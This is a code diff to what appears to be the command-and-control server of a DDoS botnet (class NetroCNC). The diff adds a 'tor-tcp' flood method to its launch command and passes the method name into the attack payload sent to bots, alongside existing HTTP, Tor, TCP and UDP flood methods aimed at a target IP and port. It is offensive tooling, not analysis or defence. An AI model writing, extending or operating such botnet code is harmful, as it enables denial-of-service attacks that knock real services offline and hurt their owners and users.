@@ -186,7 +186,7 @@ class NetroCNC(object):
         if len(args) < 1:
             return "Missing command arguments. Type \"help\" to show the launch command manual."
         
-        attack_methods = ["http", "http-post", "hcf", "tor-get", "tor-post", "tor-hcf", "tcp", "udp"]
+        attack_methods = ["http", "http-post", "hcf", "tor-get", "tor-post", "tor-hcf", "tor-tcp", "tcp", "udp"]
         attack_method = args[0].lower()
 
         if not attack_method in attack_methods:
@@ -207,6 +207,8 @@ class NetroCNC(object):
                 return self.attack_method_http(args=args, http_method="tor-post")
             case "tor-hcf":
                 return self.attack_method_http(args=args, http_method="tor-hcf")
+            case "tor-tcp":
+                return self.attack_method_tcp(args=args, tcp_method="tor-tcp")
             case "tcp":
                 return self.attack_method_tcp(args=args)
             case "udp":
@@ -265,8 +267,8 @@ class NetroCNC(object):
 
         return f"Initialized {http_method.upper()} attack on {url}\nAttack ID: {attack_id}\nTotal Bots: {total_bots}\nDuration: {duration}\nConcurrency: {concurrency}"
 
-    def attack_method_tcp(self, args: list):
-        usage = "launch tcp [IP:PORT] [DURATION] [CONCURRENCY]"
+    def attack_method_tcp(self, args: list, tcp_method: str = "tcp"):
+        usage = f"launch {tcp_method} [IP:PORT] [DURATION] [CONCURRENCY]"
 
         try:
             target = args[0]
@@ -301,7 +303,7 @@ class NetroCNC(object):
             "command": "launch",
             "attack_payload": {
                 "id": attack_id,
-                "method": "tcp",
+                "method": tcp_method,
                 "target": target,
                 "timeout": attack_timeout,
                 "concurrency": concurrency
